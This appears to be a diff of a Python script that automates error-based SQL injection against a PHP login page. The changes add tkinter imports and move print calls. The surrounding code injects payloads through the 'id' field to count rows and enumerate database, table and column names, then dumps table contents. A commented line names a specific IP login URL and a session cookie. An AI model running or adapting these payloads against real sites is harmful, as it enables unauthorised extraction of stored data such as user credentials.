@@ -2,6 +2,8 @@ import requests
 from bs4 import BeautifulSoup
 from tkinter import messagebox
 import pandas
+import tkinter
+from tkinter import Label, LabelFrame, Toplevel, ttk
 
 #url = "http://104.197.42.200/html/member/login_ok.php"
 #cookies = {'PHPSESSID': 'l7j1upr6tomr6d0mephanot9a1'}
@@ -50,7 +52,6 @@ def count_data(url, cookies, table_name):
   result = 0
   while 1:
     value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format(table_name, result)
-#		value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format('board', result)
     params = {'id': value, 'pw': 'test'}
     response = requests.post(url,data=params, cookies=cookies)
 		#print(response.content)
@@ -84,14 +85,12 @@ def find_db_name(values, url, cookies):
 
 def find_table_name(tableList, url, cookies, db_name):
   size = 0
-
   while 1:
     value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_type = 'base table' and table_schema = '{}'limit {},1), 0x7e, floor(rand(0)*2))a from information_schema.tables group by a)b) #".format(db_name,size)
-    print(value)
     params = {'id': value, 'pw': 'test'}
     response = requests.post(url, data=params, cookies=cookies)
     soup = BeautifulSoup(response.text, "html.parser")
-
+    print(value)
     if(check in response.text.encode('utf-8')):
       break
     else:
@@ -107,11 +106,10 @@ def find_column_name(columnList, url, cookies, table_name):
     size = 0
     while 1:
       value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select column_name from information_schema.columns where table_name = '{}' limit {},1),0x7e, floor(rand(0)*2))a from information_schema.TABLES group by a)b) #".format(table_name, size)
-      print(value)
       params = {'id': value, 'pw': 'test'}
       response = requests.post(url, data=params, cookies=cookies)
       soup = BeautifulSoup(response.text, "html.parser")
-
+      print(value)
       if(check in response.text.encode('utf-8')):
         break
       else:
@@ -136,11 +134,10 @@ def dump_data(url, cookies, table_name, column_list):
     list = []
     for size in range(count):
       value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select {} from {} limit {},1), 0x7e, floor(rand(0)*2))a from information_schema.tables group by a)b) #".format(column_name, table_name, size)
-      print(value)
       params = {'id': value, 'pw': 'test'}
       response = requests.post(url, data=params, cookies=cookies)
       soup = BeautifulSoup(response.text, "html.parser")
-
+      print(value)
       if check in response.text.encode('utf-8'):
         list.append("NULL")
         break
